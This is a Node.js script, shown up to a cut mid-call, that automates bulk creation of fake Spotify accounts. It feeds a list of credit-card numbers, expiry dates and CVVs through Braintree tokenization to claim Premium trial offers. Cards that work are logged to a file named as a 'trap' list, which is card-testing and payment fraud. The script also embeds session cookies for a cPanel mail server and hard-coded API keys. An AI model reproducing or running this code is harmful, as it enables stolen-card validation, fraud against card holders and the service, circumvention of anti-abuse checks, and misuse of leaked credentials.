const readlineSync = require('readline-sync');
var random_name = require('node-random-name');
const fs = require('fs');
const delay = require('delay');
var figlet = require('figlet');
var chalk = require('chalk');


let request = require("request-promise");
const cookieJar = request.jar();
request = request.defaults({ jar: cookieJar });
const axios = require('axios');
let version_ua_phone = [
    "Samsung galaxy 7edge",
    "Samsung galaxy 7",
    "Samsung galaxy 8",
    "Samsung galaxy 8edge",
    "Samsung galaxy 9edge",
    "Samsung galaxy 9",
];
let mail = [
    "@gmail.com",
    "@hotmail.com",
    "@outlook.com",
];
const { stringify, parse } = require('querystring');
const console = require('console');
const { get } = require('request');
var FormData = require('form-data');
const { URLSearchParams } = require('url');
const { parseArgs } = require('util');
const { format } = require('path');


function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < 16) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}
function getRandomInt(max) {
    return Math.floor(Math.random() * Math.floor(max));
}


(async () => {

    console.log(
        chalk.redBright(
            figlet.textSync('SPOTIFY CREATOR', { horizontalLayout: 'fitted' })
        )
    );
    console.log(
        chalk.greenBright(
            figlet.textSync('                                    [O] .=. [O]', { horizontalLayout: 'fitted' }),
        )
    );
    console.log('\n')
    var i = 0;
    var no = 0
    var o = 0
    var max=0

    function makeid(length) {
        let result = '';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < 8) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
            counter += 1;
        }
        return result;
    }
    function makeiid(length) {
        let result = '';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < 4) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
            counter += 1;
        }
        return result;
    }

    sessionID = makeid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid()//e9bdc9cb-b523-4057-9a31-4cae0d25a32d
    attempid = makeid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid()

    var cc2 = readlineSync.question(chalk.whiteBright('[+] Input Text : '));
    const file2 = fs.readFileSync(cc2, 'UTF-8');
    const mntp2 = file2.split(/\r?\n/);
    while (i < mntp2.length) {
        var pay = i + 30
        no++
        console.log("")
        var nama1 = random_name({
            first: true
        });
        var nama2 = random_name({
            last: true
        });
        var angka = Math.floor(Math.random() * 100) + 21
        var hasil = nama1 + nama2
        var hasil1 = Math.floor(Math.random() * 100) + 21;
        var hasil2 = Math.floor(Math.random() * 5) + 5
        var hasil3 = hasil + hasil1
        let tahun = [
            1990, 1991, 1992, 1993, 1994, 1995, 1996, 1997, 1999, 2000, 2001, 2002, 2003, 2004, 1989, 1988, 1987, 1985, 1986, 1984, 1983, 1982, 1981, 1980
        ]
        var email1 = nama1 + nama2 + hasil1 + '@silvistore.my.id'
        var angka1 = Math.floor(Math.random() * 100) + 100
        var angka2 = Math.floor(Math.random() * 100) + 25
        var tgl = Math.floor(Math.random() * 19) + 10
        var bulan = Math.floor(Math.random() * 8) + 1
        const randomthn = tahun[Math.floor(Math.random() * tahun.length)];
        const randomEmail = mail[Math.floor(Math.random() * mail.length)];
        const randomDevices = version_ua_phone[Math.floor(Math.random() * version_ua_phone.length)];
        var email2 = nama1 + nama2 + hasil1 + randomEmail

       
        const userAgentList = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.36 (KHTML, like Gecko) Chrome/' + angka2 + '.0.4577.' + angka2 + ' Safari/' + angka1 + '.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/' + angka1 + '.1.' + angka2 + ' (KHTML, like Gecko) Version/14.0.3 Mobile/15E' + angka1 + ' Safari/' + angka1 + '.1',

            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.' + angka2 + ' (KHTML, like Gecko) Chrome/' + angka2 + '.0.4280.' + angka1 + ' Safari/' + angka1 + '.' + angka2 + ' Edg/' + angka2 + '.0.' + angka1 + '.75',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.' + angka2 + ' (KHTML, like Gecko) Chrome/' + angka2 + '.0.3538.' + angka1 + ' Safari/' + angka1 + '.' + angka2 + ' Edge/' + angka2 + '.18363',
        ]
        const apikeylist = [
            'bff58e9698f40080ec4f9ad97a2f21e0',
            "4c7a36d5260abca4af282779720cf631",
            "a2d4b979dc624757b4fb47de483f3505",

        ]
        const randomUserAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
        const randomApiKey = apikeylist[Math.floor(Math.random() * userAgentList.length)]
        function registemail() {
            axios({
                method: "post",
                url: "https://sg1-tr2.supercp.com:2083/cpsess3116181151/execute/Email/add_pop",
                headers: {
                    "accept": "*/*",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-requested-with": "XMLHttpRequest",
                    "cookie": "roundcube_cookies=enabled; timezone=Asia/Jakarta; roundcube_sessauth=YOukGkvJh8yqM3M6qxrYBNLY53Jmio8a-1676898600; webmailsession=:ZLLH5ZhL620Akxno,78843ec5c904175ee2c029e95d2c3e6f; cpsession=silvisto:AX492XRu7JhxS6ik,5281205f8cf29a123854366c66dbc698"
                },
                data: "email=" + hasil3 + "&domain=silvistore.my.id&password=" + email1 + "&quota=5&send_welcome_email=1"

            }).then(function (res) {

            })
        }
        function changeMail() {
            axios({
                method: "put",
                url: "https://spclient.wg.spotify.com/accountsettings/v1/profile/email",
                headers: {
                    'Accept-Language': 'id-ID;q=1, en-US;q=0.5',
                    'User-Agent': 'Spotify/8.8.4.518 Android/29 (Redmi Note 8)',
                    'Spotify-App-Version': '8.8.4.518',
                    'X-Client-Id': '9a8d2f0ce77a4e248bb71fefcb557637',
                    'App-Platform': 'Android',
                    // 'Client-Token': 'AAALYP9yS2rCM/4tD169Rn6epA40P/5NDRhw48CnOC+odIRLwuwzsBZWg5gioSFRhDu6H2NmDbq9cGJOC5+Iep4tH+ta639HeRGi+irNyujmQmd2HtQfkwmnk6GQ0gFRsct3NFF98cAJE+uUmmyzzxKTbYxX2vAA+yH2x/5B9ET0BjSWkN3i9W5/5gkg2DRvNqGhrlc/vrGo5radvkE7SOrPZ717/34/625zC4/CM6V/6XD/rzHuVfKIY9vqF5Dmki2nPwy4mUsyH/7j5302Ey0YvpuKp82w3xaTy4Zm0KKvQt8qYhOzl8jyDs7i',
                    'Authorization': 'Bearer ' + bearer,
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Accept-Encoding': 'gzip',
                },
                data:
                {
                    email: email1,
                    password: "admin123"
                }
            }).then(function (res) {

            })
        }
        //SIGN UP      
        try {
            console.log(no + ". " + email2)
            let signup = await axios({
                method: 'post',
                url: 'https://spclient.wg.spotify.com/signup/public/v2/account/create',
                headers: {
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": randomUserAgent,
                    "content-type": 'application/json',
                    "accept": "*/*",
                    "accept-language": "id"
                },
                data: {
                    account_details: {
                        birthdate: `${randomthn}-0${bulan}-${tgl}`,
                        consent_flags: {
                            eula_agreed: true,
                            send_email: false,
                            third_party_email: true
                        },
                        display_name: nama1,
                        email_and_password_identifier: {
                            email: email2,
                            password: "admin123"
                        },
                        gender: 2
                    },
                    callback_uri: "https://www.spotify.com/signup/challenge?forward_url=https%3A%2F%2Fopen.spotify.com%2F%3F&locale=us",
                    client_info: {
                        api_key: randomApiKey,
                        app_version: "v2",
                        capabilities: [
                            1
                        ],
                        installation_id: sessionID,
                        platform: "www"
                    },
                },
            })
                .then(function (response) {

                    session_reg = response.data.challenge.session_id

                    //console.log(response.data)
                    // logintoken = response.data.success.login_token
                    // return logintoken;

                })

            let get_session = await axios({
                method: 'post',
                url: 'https://challenge.spotify.com/api/v1/get-session',
                headers: {
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": randomUserAgent,
                    "content-type": 'application/json',
                    "accept": "*/*",
                    "accept-language": "id"
                },
                data: {
                    "session_id": session_reg
                },
            })
                .then(function (response) {

                    // console.log(response.data)
                    challenge_reg = response.data.in_progress.challenge_details.challenge_id
                    // console.log(challenge_reg)
                    // logintoken = response.data.success.login_token
                    // return logintoken;

                })


            let challenge_cmd = await axios({
                method: 'post',
                url: "https://challenge.spotify.com/api/v1/invoke-challenge-command",
                headers: {
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site"

                },
                data: {
                    "session_id": session_reg,
                    "challenge_id": challenge_reg,
                    "dummy_challenge_v1": {
                        "noop": {}
                    }
                }
            })


            let comp_signup = await axios({
                method: 'post',
                url: "https://spclient.wg.spotify.com/signup/public/v2/account/complete-creation",
                headers: {
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site"

                },
                data: {
                    "session_id": session_reg
                },
            })
                .then(function (response) {

                    // console.log(response.data)
                    logintoken = response.data.success.login_token
                    // return logintoken;

                })

            // INTERFACE


            console.log("   Waiting For Premium Account")
            //GET COOKIE
            const result = await request.get("https://accounts.spotify.com/en/login")
            const getcsrf = cookieJar.getCookieString("https://accounts.spotify.com/en/login")
            //SPLITING sp_sso_csrf_token=
            const csrf = getcsrf.split("sp_sso_csrf_token=")
            const Fixcsrf = csrf[1].split(";")[0]
            // console.log("   " + "Sukses GET X-CSRF-Token= " + Fixcsrf)
            //SPLITING __Host-sp_csrf_sid=
            const csrf_sid = getcsrf.split("__Host-sp_csrf_sid=")
            const Fix_csrf_sid = csrf_sid[1].split(";")[0]
            //  console.log("   " + "Sukses GET Cookie SID= " + Fix_csrf_sid)

            //AUTHLOGIN
            var bodyku = "splot:" + logintoken


            let authlogin = await axios({
                method: 'POST',
                url: 'https://www.spotify.com/api/signup/authenticate',
                headers: {
                    "x-csrf-token": Fixcsrf,
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "cookie": '__Host-sp_csrf_sid=' + Fix_csrf_sid
                },
                data: {
                    "splot": logintoken
                },

            })
                .then(function (response) {
                    cookie_sp_dc = response.headers['set-cookie']

                    return response
                })

            str_cookie_sp_dc = JSON.stringify(cookie_sp_dc)

            //SPLITING SP_DC=
            const sp_dc_notfix = str_cookie_sp_dc.split("sp_dc")
            const spdc = sp_dc_notfix[1].split(";")[0]
            //   console.log("   " + "Sukses GET sp_dc" + spdc)
            // var output_cookie = {};



            // GET ACCESS TOKEN SAMSUNG
            let getAccessSamsung = await axios({
                url: "https://open.spotify.com/get_access_token?reason=transport&productType=web_player",
                method: 'get',
                headers: {
                    // "x-csrf-token": Fixcsrf,
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                    "content-type": 'application/json',
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "cookie": 'sp_dc' + spdc
                    // + '; __Host-sp_csrf_sid=' + Fix_csrf_sid
                }
            }).then(function (res) {

                bearer = res.data.accessToken
                return bearer
            })
            // console.log("   Sukses GET BearerToken= " + bearer)
            //ACTIVATE SAMSUNG DEVICES
            let activateSamsung = await axios({
                url: "https://spclient.wg.spotify.com/premium-destination-hubs/v2/page?locale=id&device_id=9b4ff48cce620e80&partner_id=&referrer_id=&build_model=Samsung-sm-n900a&cache_key=free&show_unsafe_unpublished_content=false&manufacturer=Samsung",
                method: "get",
                headers: {
                    "accept-language": 'id-ID;q=1, en-US;q=0.',
                    "user-agent": 'Spotify/8.6.4 Android/30 (Samsung-sm-n900a)',
                    "spotify-app-version": '8.6.4',
                    "app-platform": 'Android',
                    "x-client-id": '9a8d2f0ce77a4e248bb71fefcb557637',
                    "accept-Encoding": 'gzip',
                    "authorization": 'Bearer ' + bearer
                }
            }).then(function (res) {


            })

            let getSdk = await axios({
                url: "https://www.spotify.com/api/payment-sdk/v2/data/?clientName=premium-www-checkout&clientContext=premium-checkout&version=7.0.1&paymentProviderIds=billing_cards,billing_paypal&country=US&isPayment=true&showStoredPaymentDetails=false",
                method: "GET",
                headers: {
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",

                    "Braintree-Version": "2018-05-10",
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    // "cookie": "sp_key=f2b45104-d33e-4461-8ce6-4de4b5f1ee7b",
                    "cookie": 'sp_dc' + spdc,
                    "referer": "https://www.spotify.com/us/purchase/offer/new-family-1m/?country=ID"

                }
            }).then(function (res) {
                hostcookie = res.headers['set-cookie']
                xcsrf = res.headers['x-csrf-token']
                //  console.log("X-CSRF-TOKEN SDK PAYMENT " + res.headers['x-csrf-token'])
                // console.log(res.headers)
                return res
            })
            strhostcookie = JSON.stringify(hostcookie)
            //SPLITING HOST_SID=
            const strhostcookienotfix = strhostcookie.split("__Host-sp_csrf_sid")
            const host = strhostcookienotfix[1].split(";")[0]
            //  console.log("HOST SDK PAYMENT" + host)   
            //  console.log("AUTH LOGIN SUKSES")
            let upsert = await axios("https://www.spotify.com/api/user-address/v1/upsert", {
                method: "put",
                headers: {
                    "Host": "www.spotify.com",
                    "user-agent": randomUserAgent,
                    "x-csrf-token": xcsrf,
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "text/plain;charset=UTF-8",
                    "locales": "id_ID,id",
                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    //"referrer": "https://www.spotify.com/id/redirect-in-app/android_premium_promotion/?offerSlug=samsung-global2022-pdp-3m-3m-trial-one-time-code&country=ID",
                    "cookie": "sp_dc" + spdc + "; __Host-sp_csrf_sid" + host,
                },
                data: {
                    country: "US",
                    type: "tax",
                    address:
                    {
                        street: "nyc street number 2",
                        city: "New York City",
                        state: "NY",
                        postal_code_short: "10080"
                    }
                },
            }).then(function (res) {
                //  console.log(res.data)
            })

            //GET CVC
            // console.log("GETCVC")
            for (i; i < pay; i++) {
                o++
                var cardnum = mntp2[i].split('|')[0];
                var cardmonth = mntp2[i].split('|')[1];
                var cardyear = mntp2[i].split('|')[2];
                var cardcvv = mntp2[i].split('|')[3];
                if ((cardyear <= 23) && (cardmonth <= 1)) {
                    var cardyear = 23;
                } else if (cardyear < 23) {
                    var cardyear = 23;
                } else if (cardyear >= 2023) {
                    var cardyear = cardyear - 2000;
                }
                else if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;
                }
                else if ((cardyear < 2023 && cardyear > 100)) {
                    var cardyear = (cardyear - 2000) + 2;

                }
                else if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;

                }
                if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;
                }
                binCC = cardnum.slice(0, 6)
                let getCVC = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "POST",
                    withCredentials: true,
                    credentials: 'include',
                    allowCredentials: true,
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "origin": "https://pci.spotify.com",

                    },
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID //BELUM FIX SESI
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false
                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    }
                }).then(function (res) {
                    tokenCVC = res.data.data.tokenizeCreditCard.token
                    return tokenCVC

                })


                //     // CVC AUTHORIZATION
                let cvcAuth = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "POST",
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "origin": "https://pci.spotify.com",

                    },
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID //BELUM FIX SESI
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false
                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    }
                }).then(function (res) {
                    authVCC = res.data.data.tokenizeCreditCard.token
                    return res
                })

                //     // // CARD
                //    console.log("paymentku CARD")
                let card = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "post",
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    number: cardnum,
                                    expirationMonth: cardmonth,
                                    expirationYear: cardyear,
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false

                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    },
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site"
                    }
                }).then(function (res) {
                    authCC = res.data.data.tokenizeCreditCard.token
                    return res
                })
                // console.log(authVCC)
                // console.log(authCC)
                // console.log(tokenCVC)
                // console.log(host)
                // console.log(xcsrf)
                let payment = await axios("https://www.spotify.com/api/payment-sdk/v2/prepare/premium/?clientName=premium-www-checkout&clientContext=premium-checkout&version=6.5.0", {
                    method: 'post',
                    //   headers: formDataInfo.getHeaders(),
                    headers: {
                        "Host": "www.spotify.com",
                        Connection: "Keep-Alive",
                        "user-agent": randomUserAgent,
                        "x-csrf-token": xcsrf,
                        "accept": "*/*",
                        "accept-language": "en-US;q=0.8,en;q=0.7",
                        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryRcfZNv5KBhqvWkCG",
                        "locales": "id_ID,id",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "referrer": "https://www.spotify.com/us/redirect-in-app/android_premium_promotion/?offerSlug=samsung-global2022-pdp-3m-3m-trial-one-time-code&country=US",
                        "cookie": "sp_dc" + spdc + "; __Host-sp_csrf_sid" + host,
                    },
                    data: "------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.paymentProviderId\"\r\n\r\ncards\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.checkoutViewId\"\r\n\r\n" + sessionID + "\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.attemptId\"\r\n\r\n" + attempid + "\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.flowId\"\r\n\r\n1c292aac-6edb-41e0-b9d2-bc325e1a4b92\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.country\"\r\n\r\nUS\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.returnUrl\"\r\n\r\nhttps://www.spotify.com/us/purchase/success/?offerUuid=2308f605-53d3-4cfd-bc09-be331feb9bb6&offerId=3m-trial-one-time-code&orderReference={checkoutId}\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.originUrl\"\r\n\r\nhttps://www.spotify.com/us/purchase/offer/?offerSlug=samsung-global2022-pdp-3m-3m-trial-one-time-code&country=US\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.offerUuid\"\r\n\r\n2308f605-53d3-4cfd-bc09-be331feb9bb6\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.productDescription\"\r\n\r\nLangganan Spotify 3 bulanan berulang\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.isChangeDetails\"\r\n\r\nfalse\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.riskDeviceId\"\r\n\r\nrjs-eb667a73-cb5a-4f48-9dfb-32572bf8c2ac\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.browserInfo\"\r\n\r\n{\"screenWidth\":1536,\"screenHeight\":864,\"colorDepth\":24,\"userAgent\":\""+randomUserAgent+"\",\"timeZoneOffset\":-420,\"language\":\"en-EN\",\"javaEnabled\":false}\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.pci[token]\"\r\n\r\n[{\"cvc\":\"" + tokenCVC + "\",\"cvcAuthentication\":\"" + authVCC + "\",\"card\":\"" + authCC + "\",\"provider\":\"braintree\"}]\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.pci[devicefps]\"\r\n\r\n{\"adyen\":\"1B2M2Y8Asg0010000000000000pgIOdGFwF00008850000RBDzaiKzBGIvwz430qqA1B2M2Y8Asg000SsvLEc2Gfi00000qZkTE00000WrCTEuJmCytx0fL7JuDD:40\",\"digitalriver\":\"fd837e09f5302516b2deb583eaa65f00\"}\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG\r\nContent-Disposition: form-data; name=\"checkout.pci[bin]\"\r\n\r\n450185\r\n------WebKitFormBoundaryRcfZNv5KBhqvWkCG--\r\n"
                }).then(function (res) {
//console.log(res.data.data.errors)
                    statusPay = res.status
                    statusPremium = res.data.success
                    status3ds = res.data.action
                    resultpay = res.data
                    return statusPay, statusPremium
                })
                
                if (statusPay != 200) {
                    continue;
                } else if (statusPay == 200) {
                    console.log(resultpay)
                    if (statusPremium == false) {
                        // console.log(resultpay)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;

                            // remove the first line and the 5th and 6th lines in the file
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                    }
                    else if (status3ds == "iframe_challenge") {
                        // console.log(resultpay)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;

                            // remove the first line and the 5th and 6th lines in the file
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })

                    }
                    else if (status3ds == "iframe_fingerprint") {
                        // console.log(resultpay)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;
                            // remove the first line and the 5th and 6th lines in the file
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                    }
                    else if (statusPremium == true) {
                        console.log(chalk.greenBright(o + ".  Berhasil Premium => " + email1 + +" Status Premium : " + statusPremium + " | " + cardnum + "|" + cardmonth + "|" + cardyear + "|" + cardcvv))
                        fs.appendFileSync("spotify indiv.txt", email1 + "\n");
                        fs.appendFileSync("cc indiv us trap.txt", email1 + "|" + cardnum + "|" + cardmonth + "|" + cardyear + "|" + cardcvv + "\n");
                        console.log("TUNGGU 1 MENIT")
                        await delay(60000)
                        let changeMail = await
                            axios({
                                method: "put",
                                url: "https://spclient.wg.spotify.com/accountsettings/v1/profile/email",
                                headers: {
                                    'Accept-Language': 'id-ID;q=1, en-US;q=0.5',
                                    'User-Agent': 'Spotify/8.8.4.518 Android/29 (Redmi Note 8)',
                                    'Spotify-App-Version': '8.8.4.518',
                                    // 'X-Client-Id': '9a8d2f0ce77a4e248bb71fefcb557637',
                                    'App-Platform': 'Android',
